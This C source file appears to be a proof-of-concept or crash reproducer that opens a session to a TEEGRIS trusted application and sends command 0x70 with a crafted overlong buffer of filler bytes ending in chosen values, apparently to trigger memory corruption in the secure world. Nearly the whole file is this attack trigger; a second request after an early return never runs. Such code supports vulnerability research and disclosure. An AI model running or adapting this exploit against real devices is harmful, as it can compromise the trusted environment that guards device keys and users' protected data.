#include <stdio.h>
#include <unistd.h>     
#include <sys/mman.h>   
#include <sys/types.h>  
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>

TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
	system("ipcrm -M 0x13337");
	system("ipcrm -M 0x13338");
	system("ipcrm -M 0x13339");
	system("ipcrm -M 0x1333a");
#endif
}

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_OUTPUT, TEEC_VALUE_OUTPUT,
                                     TEEC_VALUE_OUTPUT, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    op.params[0].value.a = 0xdeadbeef;  // the keyblock buffer
    op.params[0].value.b =  0x370; 
    op.params[1].tmpref.buffer = (void*)malloc(0x1000);  // the keyblock buffer
    op.params[1].tmpref.size =  0x4; 
    uint32_t err_origin;

    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0xc0, &op, &err_origin);
	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);

}



int main(int argc, char **argv)
{
    char* ta = "00000000-0000-0000-0000-000048444350";
    TEEC_UUID *uuid = teegris_uuid(ta); 

    uint32_t err_origin;
    TEEC_Result res;
	TEEC_Context context;
    TEEC_Session session;
    TEEC_Operation op;

	cleanup_shm();
    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }
    char cyclic[] = "\x41\x41\x41\x22\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
    "\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42\x42"
    "\x00\xe3\xde\xe2\x00\xe3\xde\xe2";
    void* mem_area = allocate_param_mem(&context, sizeof(cyclic));
    memcpy(mem_area, cyclic, sizeof(cyclic));
    /*
    TEEC_SharedMemory in_mem;
    in_mem.buffer = mem_area;
    in_mem.size = sizeof(cyclic);
    in_mem.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;
    res = TEEC_RegisterSharedMemory_impl(&context, &in_mem);
    if (res != TEEC_SUCCESS) {
        printf("Failed to register shared memory 1 %d\n", res);
        return -1;
    }
    */
    void* mem_area2 = allocate_param_mem(&context, 0x398);
    /*
    TEEC_SharedMemory out_mem;
    out_mem.buffer = mem_area2;
    out_mem.size = 0x398;
    out_mem.flags = TEEC_MEM_INPUT |TEEC_MEM_OUTPUT;
    res = TEEC_RegisterSharedMemory_impl(&context, &out_mem);
    if (res != TEEC_SUCCESS) {
        printf("Failed to register shared memory 2 %d\n", res);
        return -1;
    }*/
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT,
                                     TEEC_NONE, TEEC_NONE);
    op.params[0].tmpref.buffer = mem_area;  // Input value
    op.params[0].tmpref.size =  0x370;
    op.params[1].tmpref.buffer = mem_area2;  // Output memory
    op.params[1].tmpref.size =  0x370;
    res = TEEC_InvokeCommand_impl(&session, 0x70, &op, &err_origin);

    return 0;
    // write banner
    send_req(&context, &session);
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
